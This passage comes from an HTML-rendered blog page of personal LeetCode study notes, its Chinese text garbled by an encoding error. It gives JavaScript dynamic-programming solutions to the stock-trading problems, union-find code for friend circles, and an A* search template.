-prices[i])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp[n-<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™ä½ç©ºé—´å¤æ‚åº¦ï¼šä¸æ„é€  DP çŸ©é˜µï¼Œä»è€Œå°†ç©ºé—´å¤æ‚åº¦é™ä½åˆ° O(1)ï¼Œå› ä¸ºæ–°çŠ¶æ€ä»…ä¸ç›¸é‚»çŠ¶æ€ç›¸å…³ã€‚ï¼ˆçŠ¶æ€å­˜å‚¨åœ¨å•ä¸ªå˜é‡ä¸­ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_i10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_i11 = -<span class="literal">Infinity</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;prices.length;i++)&#123;</span><br><span class="line">    d_i10 = <span class="built_in">Math</span>.max(d_i10, d_i11 + prices[i]);</span><br><span class="line">    d_i11 = <span class="built_in">Math</span>.max(d_i11, <span class="number">0</span> - prices[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_i10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode122â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-IIï¼ˆâ˜†ï¼‰"><a href="#LeetCode122â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-IIï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode122â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº IIï¼ˆâ˜†ï¼‰"></a>LeetCode122â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº IIï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -14"><a href="#è‡ªå·±çš„ä»£ç -14" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>æ²¡å†™å‡ºæ¥ï¼Œæœ‰å¾ˆå¤šç§æƒ…å†µã€‚é™¤äº†æ¡ˆä¾‹ç»™çš„ï¼Œè¿˜æœ‰[1,3,2,4,5]è¿™ç§ã€‚ä¸å¯èƒ½ç”¨åˆ†ç±»è®¨è®ºæ¥åšå§ï¼Ÿ</p><h3 id="æ€è·¯1-amp-é¢˜è§£-10"><a href="#æ€è·¯1-amp-é¢˜è§£-10" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>åŠ¨æ€è§„åˆ’= ï¼ˆ<a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/solution/mai-mai-gu-piao-de-zui-jia-shi-ji-ii-by-leetcode-s/">å ä¸ªå‘</a>ï¼Œä»¥åå†çœ‹å§ï¼‰</p><p>æ¥ä¸Šï¼šå³ k = +Infinityã€‚åŒæ ·å¯ä»¥å¿½ç•¥ k ã€‚DP æ–¹ç¨‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>], dp[i-<span class="number">1</span>][<span class="number">0</span>] - prices[i])</span><br></pre></td></tr></table></figure><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_ik0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_ik1 = -<span class="literal">Infinity</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">    d_ik0 = <span class="built_in">Math</span>.max(d_ik0 , d_ik1 + prices[i]);</span><br><span class="line">    d_ik1 = <span class="built_in">Math</span>.max(d_ik1, d_ik0 - prices[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_ik0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-9"><a href="#æ€è·¯2-amp-é¢˜è§£-9" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>è´ªå¿ƒï¼š<strong>å½“å¤©å¯ä»¥å–äº†ä¹‹åï¼Œåˆä¹°ä¸€è‚¡ï¼</strong>å‡è®¾ï¼Œå¦‚æœä»Šå¤©æˆ‘ä¹°äº†ï¼Œæ˜å¤©æ˜¯å¦èµšï¼Ÿï¼ˆåªè¦æ˜¯èƒ½èµšé’±ï¼Œå°±ç»Ÿç»Ÿå¤´å¤©ä¹°ï¼Œä»Šå¤©ä¹°ï¼ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>, len = prices.length; i &lt; len; i++)&#123;</span><br><span class="line">        ans += <span class="built_in">Math</span>.max(<span class="number">0</span>, prices[i] - prices[i - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-1"><a href="#å¤æ‚åº¦åˆ†æ-1" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li><p>æ—¶é—´å¤æ‚åº¦ï¼šO(n)ï¼Œå…¶ä¸­ nn ä¸ºæ•°ç»„çš„é•¿åº¦ã€‚æˆ‘ä»¬åªéœ€è¦éå†ä¸€æ¬¡æ•°ç»„å³å¯ã€‚</p></li><li><p>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚åªéœ€è¦å¸¸æ•°ç©ºé—´å­˜æ”¾è‹¥å¹²å˜é‡ã€‚</p></li></ul><h3 id="LeetCode123â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-IIIï¼ˆâ˜†â˜†â˜†ï¼‰"><a href="#LeetCode123â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-IIIï¼ˆâ˜†â˜†â˜†ï¼‰" class="headerlink" title="LeetCode123â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº IIIï¼ˆâ˜†â˜†â˜†ï¼‰"></a>LeetCode123â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº IIIï¼ˆâ˜†â˜†â˜†ï¼‰</h3><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-10"><a href="#æ€è·¯-amp-é¢˜è§£-10" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>DP k = 2ï¼Œéœ€è¦ç©·å°½ k çš„å€¼ï¼Œä¸ç¬¬ä¸€ç¬”äº¤æ˜“ä¸€èµ·ä¿å­˜ç¬¬äºŒç¬”äº¤æ˜“çš„çŠ¶æ€ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][<span class="number">2</span>][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">2</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">2</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">2</span>][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">2</span>][<span class="number">1</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>][<span class="number">0</span>] - prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>], -prices[i])</span><br></pre></td></tr></table></figure><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_i20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_i21 = -<span class="literal">Infinity</span>; </span><br><span class="line">  <span class="keyword">let</span> d_i10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_i11 = -<span class="literal">Infinity</span>; </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;prices.length; i++)&#123;</span><br><span class="line">    d_i10 = <span class="built_in">Math</span>.max(d_i10, d_i11 + prices[i]);</span><br><span class="line">    d_i11 = <span class="built_in">Math</span>.max(d_i11,  <span class="number">0</span> - prices[i]);</span><br><span class="line">    d_i20 = <span class="built_in">Math</span>.max(d_i20, d_i21 + prices[i]);</span><br><span class="line">    d_i21 = <span class="built_in">Math</span>.max(d_i21, d_i10 - prices[i]);</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_i20</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode188â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-IVï¼ˆâ˜†â˜†â˜†ï¼‰-too-hard"><a href="#LeetCode188â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-IVï¼ˆâ˜†â˜†â˜†ï¼‰-too-hard" class="headerlink" title="LeetCode188â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº IVï¼ˆâ˜†â˜†â˜†ï¼‰(too hard)"></a>LeetCode188â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº IVï¼ˆâ˜†â˜†â˜†ï¼‰(too hard)</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iv/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-11"><a href="#æ€è·¯-amp-é¢˜è§£-11" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>DPï¼šk ä¸ºæ­£æ•´æ•°ã€‚äº¤æ˜“åŒ…æ‹¬ä¹°å–ï¼Œè‡³å°‘éœ€è¦ 2 å¤©ã€‚å› æ­¤æœ‰æ•ˆé™åˆ¶ k ä¸åº”è¶…è¿‡ n/2ï¼ˆn ä¸ºå¤©æ•°ï¼‰ã€‚å¦‚æœè¶…è¿‡ï¼Œåˆ™æ²¡æœ‰çº¦æŸæ•ˆåº”ä½¿ k ç­‰äº +Infinityã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">k, prices</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(prices.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// When k becomes so much larger than the number of prices we can make transactions whenever.</span></span><br><span class="line">    <span class="keyword">if</span>(k &gt; (prices.length / <span class="number">2</span>) )&#123;</span><br><span class="line">      <span class="keyword">let</span> d_ik0 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">let</span> d_ik1 =  -<span class="literal">Infinity</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>; i&lt;prices.length;i++)&#123;</span><br><span class="line">        d_ik0 = <span class="built_in">Math</span>.max(d_ik0, d_ik1 + prices[i]);</span><br><span class="line">        d_ik1 = <span class="built_in">Math</span>.max(d_ik1, d_ik0 - prices[i]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> d_ik0</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> dp = [];</span><br><span class="line">        <span class="keyword">let</span> size = prices.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;size; i++)&#123;</span><br><span class="line">          dp[i] = [];</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0</span>; j&lt;=k; j++)&#123;</span><br><span class="line">            dp[i][j] = []</span><br><span class="line">            <span class="keyword">if</span>(i-<span class="number">1</span> === -<span class="number">1</span> || j-<span class="number">1</span> === -<span class="number">1</span>)&#123;</span><br><span class="line">              dp[i][j][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">              dp[i][j][<span class="number">1</span>] = -prices[i];</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][j][<span class="number">0</span>] = <span class="built_in">Math</span>.max(dp[i-<span class="number">1</span>][j][<span class="number">0</span>], dp[i-<span class="number">1</span>][j][<span class="number">1</span>] + prices[i]);</span><br><span class="line">            dp[i][j][<span class="number">1</span>] = <span class="built_in">Math</span>.max(dp[i-<span class="number">1</span>][j][<span class="number">1</span>], dp[i-<span class="number">1</span>][j-<span class="number">1</span>][<span class="number">0</span>] - prices[i])</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">return</span> dp[size-<span class="number">1</span>][k][<span class="number">0</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode188â€”â€”æœ€ä½³ä¹°å–è‚¡ç¥¨æ—¶æœºå«å†·å†»æœŸï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode188â€”â€”æœ€ä½³ä¹°å–è‚¡ç¥¨æ—¶æœºå«å†·å†»æœŸï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode188â€”â€”æœ€ä½³ä¹°å–è‚¡ç¥¨æ—¶æœºå«å†·å†»æœŸï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode188â€”â€”æœ€ä½³ä¹°å–è‚¡ç¥¨æ—¶æœºå«å†·å†»æœŸï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-12"><a href="#æ€è·¯-amp-é¢˜è§£-12" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>DPï¼š<strong>k = +Infinity ä¸”æœ‰å†·å´æ—¶é—´</strong>ï¼Œæ‰€ä»¥å¿…é¡»åœ¨å–å‡ºè‚¡ç¥¨åç­‰å¾…ä¸€å¤©æ‰èƒ½ç»§ç»­äº¤æ˜“ã€‚æˆ‘ä»¬å¯ä»¥å°†çŠ¶æ€è½¬ç§»æ–¹ç¨‹å†™ä¸ºï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>], dp[i-<span class="number">2</span>][<span class="number">0</span>] - prices[i])</span><br></pre></td></tr></table></figure><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_ik0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_ik1 = -<span class="literal">Infinity</span>;</span><br><span class="line">  <span class="keyword">let</span> d_ik0_pre = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> d_ik0_old = d_ik0; </span><br><span class="line">    d_ik0 = <span class="built_in">Math</span>.max(d_ik0 , d_ik1 + prices[i]);</span><br><span class="line">    d_ik1 = <span class="built_in">Math</span>.max(d_ik1, d_ik0_pre - prices[i]);</span><br><span class="line">    d_ik0_pre = d_ik0_old;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_ik0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode188â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœºå«æ‰‹ç»­è´¹ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode188â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœºå«æ‰‹ç»­è´¹ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode188â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœºå«æ‰‹ç»­è´¹ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode188â€”â€”ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœºå«æ‰‹ç»­è´¹ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-13"><a href="#æ€è·¯-amp-é¢˜è§£-13" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>DPï¼š<strong>k = +Infinity å«æœ‰äº¤æ˜“è´¹</strong>ã€‚ç¬¬ i å¤©ä¹°å…¥æˆ–å–å‡ºè‚¡ç¥¨åçš„åˆ©æ¶¦åº”è¯¥å‡å»è¿™ä¸ªé‡‘é¢ï¼Œå› æ­¤æ–°çš„ DP æ–¹ç¨‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][k][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][k][<span class="number">0</span>], dp[i-<span class="number">1</span>][k][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][k][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][k][<span class="number">1</span>], dp[i-<span class="number">1</span>][k][<span class="number">0</span>] - prices[i] - fee)</span><br><span class="line"><span class="comment">//or</span></span><br><span class="line">dp[i][k][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][k][<span class="number">0</span>], dp[i-<span class="number">1</span>][k][<span class="number">1</span>] + prices[i] - fee)</span><br><span class="line">dp[i][k][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][k][<span class="number">1</span>], dp[i-<span class="number">1</span>][k][<span class="number">0</span>] - prices[i])</span><br></pre></td></tr></table></figure><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices, fee</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_ik0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_ik1 = -<span class="literal">Infinity</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">    d_ik0 = <span class="built_in">Math</span>.max(d_ik0 , d_ik1 + prices[i]);</span><br><span class="line">    d_ik1 = <span class="built_in">Math</span>.max(d_ik1, d_ik0 - prices[i] - fee);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_ik0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‰ªæ"><a href="#å‰ªæ" class="headerlink" title="å‰ªæ"></a>å‰ªæ</h1><h2 id="LeetCode51â€”â€”Nçš‡åï¼ˆâ˜†â˜†â˜†ï¼‰todoï¼"><a href="#LeetCode51â€”â€”Nçš‡åï¼ˆâ˜†â˜†â˜†ï¼‰todoï¼" class="headerlink" title="LeetCode51â€”â€”Nçš‡åï¼ˆâ˜†â˜†â˜†ï¼‰todoï¼"></a>LeetCode51â€”â€”Nçš‡åï¼ˆâ˜†â˜†â˜†ï¼‰todoï¼</h2><p><a href="https://leetcode-cn.com/problems/n-queens/">è·³è½¬åœ°å€</a></p><p>çœ‹è§†é¢‘ï¼è¿˜æœ‰ä½è¿ç®—çš„è§£æ³•ã€‚</p><h2 id="LeetCode37â€”â€”è§£æ•°ç‹¬ï¼ˆâ˜†â˜†â˜†ï¼‰todoï¼"><a href="#LeetCode37â€”â€”è§£æ•°ç‹¬ï¼ˆâ˜†â˜†â˜†ï¼‰todoï¼" class="headerlink" title="LeetCode37â€”â€”è§£æ•°ç‹¬ï¼ˆâ˜†â˜†â˜†ï¼‰todoï¼"></a>LeetCode37â€”â€”è§£æ•°ç‹¬ï¼ˆâ˜†â˜†â˜†ï¼‰todoï¼</h2><p><a href="https://leetcode-cn.com/problems/sudoku-solver/#/description">è·³è½¬åœ°å€</a></p><p>14è¯¾2</p><h1 id="å­—å…¸æ ‘ï¼ˆTrie-æ ‘ï¼‰ä¸å¹¶æŸ¥é›†"><a href="#å­—å…¸æ ‘ï¼ˆTrie-æ ‘ï¼‰ä¸å¹¶æŸ¥é›†" class="headerlink" title="å­—å…¸æ ‘ï¼ˆTrie æ ‘ï¼‰ä¸å¹¶æŸ¥é›†"></a>å­—å…¸æ ‘ï¼ˆTrie æ ‘ï¼‰ä¸å¹¶æŸ¥é›†</h1><h2 id="åŸºæœ¬æ€§è´¨"><a href="#åŸºæœ¬æ€§è´¨" class="headerlink" title="åŸºæœ¬æ€§è´¨"></a>åŸºæœ¬æ€§è´¨</h2><ul><li>ç»“ç‚¹æœ¬èº«ä¸å­˜å®Œæ•´å•è¯;</li><li>ä»æ ¹ç»“ç‚¹åˆ°æŸä¸€ç»“ç‚¹ï¼Œè·¯å¾„ä¸Šç»è¿‡çš„å­—ç¬¦è¿æ¥èµ·æ¥ï¼Œä¸ºè¯¥ç»“ç‚¹å¯¹åº”çš„å­—ç¬¦ä¸²;</li><li>æ¯ä¸ªç»“ç‚¹çš„æ‰€æœ‰å­ç»“ç‚¹è·¯å¾„ä»£è¡¨çš„å­—ç¬¦éƒ½ä¸ç›¸åŒã€‚ </li></ul><p><strong>ç»“ç‚¹çš„å†…éƒ¨å®ç°ï¼š</strong></p><p><img src="https://i.loli.net/2021/09/03/ZFHKTMRDui6WbQX.png" alt="image.png"></p><h2 id="LeetCode116â€”â€”æœ‹å‹åœˆï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode116â€”â€”æœ‹å‹åœˆï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode116â€”â€”æœ‹å‹åœˆï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode116â€”â€”æœ‹å‹åœˆï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/bLyHh0/">è·³è½¬åœ°å€</a></p><p>DFS è§£æ³•åŒ LC200 å²›å±¿æ•°é‡ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-14"><a href="#æ€è·¯-amp-é¢˜è§£-14" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p><strong>Union Findï¼Œå¹¶æŸ¥é›†ï¼š</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findCircleNum = <span class="function"><span class="keyword">function</span>(<span class="params">M</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> dsu = <span class="keyword">new</span> DSU(M.length);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; M.length; row++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; M[<span class="number">0</span>].length; col++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(M[row][col] === <span class="number">1</span>) &#123;</span><br><span class="line">                dsu.union(row, col);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Set</span>(M.map(<span class="function">(<span class="params">m, i</span>) =&gt;</span> dsu.find(i))).size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DSU</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">N</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parent = [...new <span class="built_in">Array</span>(N).keys()];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">find</span>(<span class="params">x</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.parent[x] !== x) &#123;</span><br><span class="line">            <span class="built_in">this</span>.parent[x] = <span class="built_in">this</span>.find(<span class="built_in">this</span>.parent[x]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.parent[x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">union</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parent[<span class="built_in">this</span>.find(x)] = <span class="built_in">this</span>.find(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="A-searchï¼ˆå¯å‘å¼æœç´¢ï¼‰"><a href="#A-searchï¼ˆå¯å‘å¼æœç´¢ï¼‰" class="headerlink" title="A* searchï¼ˆå¯å‘å¼æœç´¢ï¼‰"></a>A* searchï¼ˆå¯å‘å¼æœç´¢ï¼‰</h1><h2 id="æ¨¡æ¿ï¼š"><a href="#æ¨¡æ¿ï¼š" class="headerlink" title="æ¨¡æ¿ï¼š"></a>æ¨¡æ¿ï¼š</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def bfs(graph, start,end):</span><br><span class="line">  queue = []</span><br><span class="line">  queue.append([start])</span><br><span class="line">  visited.add(start)</span><br><span class="line"></span><br><span class="line">  while queue:</span><br><span class="line">    node = queue.pop()</span><br><span class="line">    visited.add(node)</span><br><span class="line">    </span><br><span class="line">    process(node)</span><br><span class="line">    nodes=generate_related_nodes(node)</span><br><span class="line">    queue.push(nodes)</span><br></pre></td></tr></table></figure><h2 id="ä¼°ä»·å‡½æ•°"><a href="#ä¼°ä»·å‡½æ•°" class="headerlink" title="ä¼°ä»·å‡½æ•°"></a>ä¼°ä»·å‡½æ•°</h2><p>å¯å‘å¼å‡½æ•°: h(n), å®ƒç”¨æ¥è¯„ä»·å“ªäº›ç»“ç‚¹æœ€æœ‰å¸Œæœ›çš„æ˜¯ä¸ªæˆ‘ä»¬è¦æ‰¾çš„ç»“ç‚¹ï¼Œh(n) ä¼šè¿”å›ä¸€ä¸ªéè´Ÿå®æ•°ï¼Œä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯ä»ç»“ç‚¹nçš„ç›®æ ‡ç»“ç‚¹è·¯å¾„çš„ä¼°è®¡æˆæœ¬ã€‚</p><p>å¯å‘å¼å‡½æ•°æ˜¯ä¸€ç§å‘ŠçŸ¥æœç´¢æ–¹å‘çš„æ–¹æ³•ã€‚å®ƒæä¾›äº†-ç§æ˜æ™ºçš„æ–¹æ³•æ¥çŒœæµ‹å“ªä¸ªé‚»å±…ç»“ç‚¹ä¼šå¯¼å‘ä¸€ä¸ªç›®æ ‡ã€‚</p><h2 id="LeetCode1091â€”â€”äºŒè¿›åˆ¶çŸ©é˜µä¸­çš„æœ€çŸ­è·¯å¾„ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode1091â€”â€”äºŒè¿›åˆ¶çŸ©é˜µä¸­çš„æœ€çŸ­è·¯å¾„ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode1091â€”â€”äºŒè¿›åˆ¶çŸ©é˜µä¸­çš„æœ€çŸ­è·¯å¾„ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode1091â€”â€”äºŒè¿›åˆ¶çŸ©é˜µä¸­çš„æœ€çŸ­è·¯å¾„ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/shortest-path-in-binary-matrix/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-15"><a href="#æ€è·¯-amp-é¢˜è§£-15" class="headerlink" 